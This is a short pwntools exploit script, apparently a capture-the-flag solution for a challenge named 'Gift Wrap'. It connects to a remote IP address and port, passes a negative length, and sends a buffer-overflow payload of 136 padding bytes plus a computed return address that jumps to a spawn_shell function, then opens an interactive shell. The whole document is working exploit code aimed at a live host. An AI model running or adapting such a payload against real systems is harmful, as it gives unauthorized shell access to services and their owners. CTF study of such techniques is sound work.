#Gift Wrap 

from pwn import *

p = remote('35.198.185.193',1338)

p.recv()
p.sendline('wrap')

p.recv()
p.sendline('-10')

p.recv()

p.sendline("A"*136+p64(0x7ff6c48169d3))

p.interactive()

#0x000009d3 = spawn_shell
#0x7ff6c4816000 = base_address
#0x7ff6c48169d3 = added address  



